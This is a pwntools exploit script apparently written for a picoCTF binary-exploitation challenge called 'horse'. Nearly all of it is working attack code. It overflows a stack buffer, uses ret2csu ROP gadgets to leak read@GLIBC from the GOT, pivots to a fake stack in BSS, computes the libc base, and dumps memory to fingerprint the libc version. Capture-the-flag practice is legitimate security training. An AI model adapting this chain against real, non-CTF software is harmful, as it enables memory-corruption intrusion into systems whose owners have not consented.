from pwn import *

# Set architecture
context.arch = 'amd64'
context.os = 'linux'

# Remote connection
r = remote('mars.picoctf.net', 31809)

# Binary and ELF
elf = ELF('./horse')
rop = ROP(elf)

# Addresses
got_read = elf.got['read']
got_write = elf.got['write']

# Gadgets
csu_pop = 0x400bfa 
csu_call = 0x400be0
pop_rbp_chain = 0x400bfb 
main_skip_setup = 0x400b6f
fake_stack = 0x602040 # End of BSS, spilling to Heap

def leak_read():
    # Payload 1: Leak read
    payload = b'A' * 32
    payload += b'B' * 8 
    
    # ret2csu to call write(1, got_read, 8)
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_read) + p64(8)
    payload += p64(csu_call)
    payload += b'J' * 8 
    
    # Return to main logic with fake stack
    payload += p64(pop_rbp_chain)
    payload += p64(fake_stack) 
    payload += p64(0) * 4     
    payload += p64(main_skip_setup) 

    log.info("Sending leak payload...")
    r.sendline(payload)
    
    r.recvuntil(b'/     /   \xc2\xb4\n')
    
    try:
        leaked_data = r.recvn(8)
        leaked_read = u64(leaked_data)
        log.success(f"Leaked read@GLIBC: {hex(leaked_read)}")
        return leaked_read
    except Exception as e:
        log.error(f"Failed to receive leak: {e}")
        exit()

leaked_read = leak_read()

# Assume offset 0x111130
libc_base = leaked_read - 0x111130
log.info(f"Calculated libc base: {hex(libc_base)}")

# Payload 2: Dump libc header
payload = b'A' * 32
payload += p64(fake_stack) # Saved RBP

# ret2csu to call write(1, libc_base, 0x1000)
payload += p64(csu_pop)
payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(libc_base) + p64(0x1000)
payload += p64(csu_call)
payload += b'J' * 8 
payload += b'K' * 48
payload += p64(0xdeadbeef)

log.info("Sending dump payload...")
r.sendline(payload)

r.recvuntil(b'/     /   \xc2\xb4\n')

# Receive dump
try:
    dump = r.recvn(0x1000)
    log.info("Dump received")
    if dump.startswith(b'\x7fELF'):
        log.success("ELF header found! Offset is correct.")
        with open('libc_header.dump', 'wb') as f:
            f.write(dump)
        import subprocess
        try:
            output = subprocess.check_output("strings libc_header.dump | grep Ubuntu", shell=True)
            log.info(f"Libc version string: {output.decode().strip()}")
        except:
            log.info("Version string not found in header")
    else:
        log.warning("ELF header NOT found. Offset might be wrong.")
        # Print first 16 bytes
        print(hexdump(dump[:16]))

except Exception as e:
    log.error(f"Failed dump: {e}")

r.close()
